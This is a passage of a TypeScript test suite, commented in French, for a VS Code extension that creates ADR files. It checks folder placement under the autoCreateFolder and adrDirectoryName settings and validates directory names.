			assert(finalUri.fsPath.includes('adr_Test_Linux_AutoCreate_Disabled'), 'Le fichier devrait avoir le bon nom');
		} finally {
			// Restaure les fonctions originales
			vscode.window.showInputBox = originalShowInputBox;
			vscode.workspace.getConfiguration = originalGetConfiguration;
		}
	});

	test('Should validate adrDirectoryName when autoCreateFolder is true', async () => {
		const mockFileWriter = new MockFileWriter();
		
		// Mock de showInputBox pour retourner un titre valide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('Test ADR Directory Validation');
		} as typeof vscode.window.showInputBox;

		// Mock de la configuration avec adrDirectoryName invalide et autoCreateFolder à true
		const originalGetConfiguration = vscode.workspace.getConfiguration;
		vscode.workspace.getConfiguration = function() {
			return {
				get: function(key: string, defaultValue?: unknown) {
					if (key === 'adrFilePrefix') {
						return 'adr_';
					}
					if (key === 'adrDirectoryName') {
						return 'invalid/directory/name'; // Nom de répertoire invalide avec des slashes
					}
					if (key === 'autoCreateFolder') {
						return true; // Créer automatiquement le sous-répertoire ADR
					}
					return defaultValue;
				}
			} as vscode.WorkspaceConfiguration;
		} as typeof vscode.workspace.getConfiguration;

		try {
			const testUri = vscode.Uri.file('/test/path/project');
			await createAdr(testUri, mockFileWriter);

			assert(!mockFileWriter.writeFileCalled, 'Le fichier ne devrait pas être écrit');
			assert(!mockFileWriter.writeFileUri, 'L\'URI ne devrait pas être défini');
		} finally {
			// Restaure les fonctions originales
			vscode.window.showInputBox = originalShowInputBox;
			vscode.workspace.getConfiguration = originalGetConfiguration;
		}
	});

	test('Should handle custom adrDirectoryName with autoCreateFolder enabled', async () => {
		const mockFileWriter = new MockFileWriter();
		
		// Mock de showInputBox pour retourner un titre valide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('Test Custom ADR Directory');
		} as typeof vscode.window.showInputBox;

		// Mock de la configuration avec un nom de répertoire ADR personnalisé et autoCreateFolder à true
		const originalGetConfiguration = vscode.workspace.getConfiguration;
		vscode.workspace.getConfiguration = function() {
			return {
				get: function(key: string, defaultValue?: unknown) {
					if (key === 'adrFilePrefix') {
						return 'adr_';
					}
					if (key === 'adrDirectoryName') {
						return 'decisions'; // Répertoire ADR personnalisé
					}
					if (key === 'autoCreateFolder') {
						return true; // Créer automatiquement le sous-répertoire ADR
					}
					return defaultValue;
				}
			} as vscode.WorkspaceConfiguration;
		} as typeof vscode.workspace.getConfiguration;

		try {
			const testUri = vscode.Uri.file('test/path/project');
			await createAdr(testUri, mockFileWriter);
			
			assert(mockFileWriter.writeFileCalled, 'Le fichier devrait être écrit');
			assert(mockFileWriter.writeFileUri, 'L\'URI devrait être défini');
			
			// Vérifier que le fichier est créé dans le répertoire personnalisé
			const finalUri = mockFileWriter.writeFileUri!;
			assert(finalUri.fsPath.includes('test/path/project/decisions'), 'Le chemin devrait être dans le répertoire personnalisé');
			assert(finalUri.fsPath.includes('adr_Test_Custom_ADR_Directory'), 'Le fichier devrait avoir le bon nom');
		} finally {
			// Restaure les fonctions originales
			vscode.window.showInputBox = originalShowInputBox;
			vscode.workspace.getConfiguration = originalGetConfiguration;
		}
	});

	test('Should handle custom adrDirectoryName with autoCreateFolder disabled', async () => {
		const mockFileWriter = new MockFileWriter();
		
		// Mock de showInputBox pour retourner un titre valide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('Test Custom ADR Directory Disabled');
		} as typeof vscode.window.showInputBox;

		// Mock de la configuration avec un nom de répertoire ADR personnalisé et autoCreateFolder à false
		const originalGetConfiguration = vscode.workspace.getConfiguration;
		vscode.workspace.getConfiguration = function() {
			return {
				get: function(key: string, defaultValue?: unknown) {
					if (key === 'adrFilePrefix') {
						return 'adr_';
					}
					if (key === 'adrDirectoryName') {
						return 'decisions'; // Répertoire ADR personnalisé
					}
					if (key === 'autoCreateFolder') {
						return false; // Ne pas créer automatiquement le sous-répertoire ADR
					}
					return defaultValue;
				}
			} as vscode.WorkspaceConfiguration;
		} as typeof vscode.workspace.getConfiguration;

		try {
			const testUri = vscode.Uri.file('test/path/project');
			await createAdr(testUri, mockFileWriter);
			
			assert(mockFileWriter.writeFileCalled, 'Le fichier devrait être écrit');
			assert(mockFileWriter.writeFileUri, 'L\'URI devrait être défini');
			
			// Vérifier que le fichier est créé directement dans le répertoire courant (ignorant le nom personnalisé)
			const finalUri = mockFileWriter.writeFileUri!;
			assert(finalUri.fsPath.includes('test/path/project'), 'Le chemin devrait être dans le répertoire courant');
			assert(!finalUri.fsPath.includes('/decisions/'), 'Le chemin ne devrait pas contenir le répertoire personnalisé');
			assert(finalUri.fsPath.includes('adr_Test_Custom_ADR_Directory_Disabled'), 'Le fichier devrait avoir le bon nom');
		} finally {
			// Restaure les fonctions originales
			vscode.window.showInputBox = originalShowInputBox;
			vscode.workspace.getConfiguration = originalGetConfiguration;
		}
	});

	test('Should handle boolean autoCreateFolder configuration correctly', async () => {
		const mockFileWriter = new MockFileWriter();
		
		// Mock de showInputBox pour retourner un titre valide
		const originalShowInputBox = vscode.window.showInputBox;
		vscode.window.showInputBox = function() {
			return Promise.resolve('Test Boolean AutoCreate Config');
		} as typeof vscode.window.showInputBox;

		// Test avec autoCreateFolder explicitement à true
		const originalGetConfiguration = vscode.workspace.getConfiguration;
		vscode.workspace.getConfiguration = function() {
			return {
				get: function(key: string, defaultValue?: unknown) {
					if (key === 'adrFilePrefix') {
						return 'adr_';
					}
					if (key === 'adrDirectoryName') {
						return 'adr';
					}
					if (key === 'autoCreateFolder') {
						return true; // Configuration booléenne explicite
					}
					return defaultValue;
				}
			} as vscode.WorkspaceConfiguration;
		} as typeof vscode.workspace.getConfiguration;

		try {
			const testUri = vscode.Uri.file('test/path/project');
			await createAdr(testUri, mockFileWriter);
			
			assert(mockFileWriter.writeFileCalled, 'Le fichier devrait être écrit');
			assert(mockFileWriter.writeFileUri, 'L\'URI devrait être défini');
			
			// Vérifier que le fichier est créé dans le sous-répertoire adr
			const finalUri = mockFileWriter.writeFileUri!;
			assert(finalUri.fsPath.includes('test/path/project/adr'), 'Le chemin devrait être dans le sous-répertoire adr');
			assert(finalUri.fsPath.includes('adr_Test_Boolean_AutoCreate_Config'), 'Le fichier devrait avoir le bon nom');
		} finally {
			// Restaure les fonctions originales
			vscode.window.showInputBox = originalShowInputBox;
			vscode.workspace.getConfiguration = originalGetConfiguration;
		}
	});

	test('Should document default behavior and all scenarios for autoCreateFolder feature', async () => {
		// Ce test documente le comportement par défaut et tous les scénarios
		// de la nouvelle fonctionnalité adr.autoCreateFolder
		
		const scenarios = [
			{
				name: 'autoCreateFolder: true (default)',
				config: { autoCreateFolder: true, adrDirectoryName: 'adr' },
				expectedBehavior: 'Création dans le sous-répertoire ADR',
				expectedPath: 'test/path/project/adr/adr_Test_20250127.md'
			},
			{
				name: 'autoCreateFolder: false',
				config: { autoCreateFolder: false, adrDirectoryName: 'adr' },
				expectedBehavior: 'Création directe dans le répertoire courant',
				expectedPath: 'test/path/project/adr_Test_20250127.md'
			},
			{
				name: 'autoCreateFolder: undefined',
				config: { autoCreateFolder: undefined, adrDirectoryName: 'adr' },
				expectedBehavior: 'Comportement par défaut (création directe)',
				expectedPath: 'test/path/project/adr_Test_20250127.md'
			},
			{
				name: 'Custom directory with autoCreateFolder: true',
				config: { autoCreateFolder: true, adrDirectoryName: 'decisions' },
				expectedBehavior: 'Création dans le répertoire personnalisé',
				expectedPath: 'test/path/project/decisions/adr_Test_20250127.md'
			},
			{
				name: 'Custom directory with autoCreateFolder: false',
				config: { autoCreateFolder: false, adrDirectoryName: 'decisions' },
				expectedBehavior: 'Création directe (ignore le répertoire personnalisé)',
				expectedPath: 'test/path/project/adr_Test_20250127.md'
			},
			{
				name: 'Existing ADR directory with autoCreateFolder: false',
				config: { autoCreateFolder: false, adrDirectoryName: 'adr' },
				expectedBehavior: 'Création dans le répertoire ADR existant',
				expectedPath: 'test/path/adr/adr_Test_20250127.md'
			}
		];

		// Vérifier que tous les scénarios sont documentés
		assert(scenarios.length >= 6, 'Tous les scénarios principaux doivent être documentés');
		
		// Vérifier que chaque scénario a les propriétés requises
		for (const scenario of scenarios) {
			assert(scenario.name, 'Chaque scénario doit avoir un nom');
			assert(scenario.config, 'Chaque scénario doit avoir une configuration');
			assert(scenario.expectedBehavior, 'Chaque scénario doit avoir un comportement attendu');
			assert(scenario.expectedPath, 'Chaque scénario doit avoir un chemin attendu');
		}

		// Vérifier la compatibilité multiplateforme
		const windowsScenarios = scenarios.filter(s => s.expectedPath.includes('test/path'));
		const linuxScenarios = scenarios.filter(s => s.expectedPath.includes('test/path'));
		
		assert(windowsScenarios.length === scenarios.length, 'Tous les scénarios doivent être compatibles Windows');
		assert(linuxScenarios.length === scenarios.length, 'Tous les scénarios doivent être compatibles Linux');

		// Test de validation des noms de répertoires
		const invalidDirectoryNames = [
			'invalid/directory/name',
			'directory with spaces',
			'directory.with.dots',
			'directory\\with\\backslashes'
		];

		for (const invalidName of invalidDirectoryNames) {
			// Vérifier que les noms invalides sont rejetés quand autoCreateFolder est true
			assert(
				!SecurityValidator.validateAdrDirectoryName(invalidName),
				`Le nom de répertoire invalide "${invalidName}" devrait être rejeté`
			);
		}

		// Test de validation des noms valides
		const validDirectoryNames = [
			'adr',
			'decisions',
			'architecture_decisions',
			'ADR_Folder'
		];

		for (const validName of validDirectoryNames) {
			// Vérifier que les noms valides sont acceptés
			assert(
				SecurityValidator.validateAdrDirectoryName(validName),
				`Le nom de répertoire valide "${validName}" devrait être accepté`
			);
		}

		// Documenter les avantages de cette fonctionnalité
		const benefits = [
			'Flexibilité pour les utilisateurs qui préfèrent organiser leurs ADR différemment',
			'Compatibilité avec les projets existants qui n\'utilisent pas de sous-répertoire ADR',
			'Rétrocompatibilité avec le comportement actuel (autoCreateFolder: true par défaut)',
			'Support des répertoires ADR personnalisés avec autoCreateFolder: true',
			'Validation de sécurité maintenue pour tous les scénarios'
		];

		assert(benefits.length >= 5, 'Les avantages de la fonctionnalité doivent être documentés');

		// Test réussi si on arrive ici
		assert(true, 'Documentation complète de la fonctionnalité autoCreateFolder');
	});
}); 